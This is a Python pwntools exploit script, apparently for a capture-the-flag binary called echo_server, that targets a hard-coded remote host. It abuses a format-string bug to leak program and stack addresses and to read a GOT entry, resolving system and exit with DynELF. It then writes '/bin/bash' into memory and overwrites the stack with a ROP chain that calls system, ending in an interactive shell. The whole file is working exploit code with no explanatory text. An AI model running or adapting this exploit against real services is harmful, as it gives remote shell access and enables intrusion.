#!/usr/bin/env python2
from pwn import *

def loc():
    global elf, libc, program_index, stack_index, input_index
    elf = ELF("./echo_server")

    # index that leaks a program address
    program_index = 1
    # index that leaks the proper stack address
    stack_index = 141
    # index at which we start seeing our own input on the stack
    input_index = 6

    return process("./echo_server")

def rem():
    global elf, libc, program_index, stack_index, input_index
    elf = ELF("./echo_server")

    # index that leaks a program address
    program_index = 1
    # index that leaks the proper stack address
    stack_index = 141
    # index at which we start seeing our own input on the stack
    input_index = 6

    return remote("174.138.113.205", 3004)

def format_lx(i):
    return "%{}$lx".format(str(i).rjust(4, "0"))

def format_s(i):
    return "%{}$s".format(str(i).rjust(5, "0"))

def format_hhn(i):
    return "%{}$hhn".format(str(i).rjust(3, "0"))

def format_data(i, length):
    return "%{}${}d".format(str(i).rjust(6, "0"), str(length).rjust(7, "0"))

def pause():
    raw_input("PAUSE")

# Enumerate the data available as printf arguments
def enumerate(start, end):
    global r

    for i in range(start, end):
        input = format_lx(i)
        r.send(input)
        print "%d: %s" % (i, r.recv(1024))

r = rem()

# # pause and attach with debugger to check rbp and program base address
# pause()

# # find an address that points to the stack and one that points to the program
# enumerate(0, 500)
# exit(0)

r.send(format_lx(program_index))
address = r.recv(1024)
address = int(address, 16)
program_base = address & 0xfffffffffffff000

r.send(format_lx(stack_index))
address = r.recv(1024)
address = int(address, 16)
rbp = address - 0xf8

def read(address):
    address = p64(address)
    separator = "A" * 8 + address[: address.index("\x00")]

    input = format_s(input_index + 2) + "A" * 8 + address
    r.send(input)

    output = r.recv(1024)
    output = output[: output.find(separator)]
    output += "\x00"

    return output

def write(address, value):
    address = p64(address)

    if value > 0:
        input = format_data(20, value) + format_hhn(input_index + 3) + address
    else:
        input = format_hhn(input_index + 1) + address

    r.send(input)

    # Receive all the data
    for i in range(0, value + len(address[: address.find("\x00")]), 1024):
        r.recv(1024)

def write_bytes(address, string):
    for i in range(len(string)):
        byte = string[i]
        byte = u8(byte)

        try:
            write(address + i, byte)
        except Exception as e:
            print hex(byte)
            raise e

read_got = elf.got["read"]
read_got = program_base + read_got

bss = program_base + elf.bss()
command_location = bss + 0x100

pop_rdi_gadget = 0x9a3
pop_rdi_gadget = program_base + pop_rdi_gadget
ret_gadget = pop_rdi_gadget + 1

address = read(read_got)
address = address.ljust(8, "\x00")
read_real_address = u64(address)

d = DynELF(read, read_real_address)
system_real_address = d.lookup("system")
exit_real_address = d.lookup("exit")

print ""
print "read: %s" % hex(read_real_address)
print "system: %s" % hex(system_real_address)
print "exit: %s" % hex(exit_real_address)
print ""
print "program base:    %s" % hex(program_base)
print "bss: %s" % hex(bss)
print "command location: %s" % hex(command_location)
print "pop rdi: %s" % hex(pop_rdi_gadget)
print "rbp: %s" % hex(rbp)

write_bytes(command_location, "/bin/bash")

chain = [
    # Set argument to the address of our command
    p64(pop_rdi_gadget),
    p64(command_location),
    # Align stack address for Ubuntu 18.04
    p64(ret_gadget),
    # Return to system
    p64(system_real_address),

    # Set argument to 0
    p64(pop_rdi_gadget),
    p64(0),
    # Return to exit
    p64(exit_real_address),
]

for i in range(len(chain)):
    write_bytes(rbp + 0x8 * (i + 1), chain[i])

r.send("EXIT")
r.interactive()
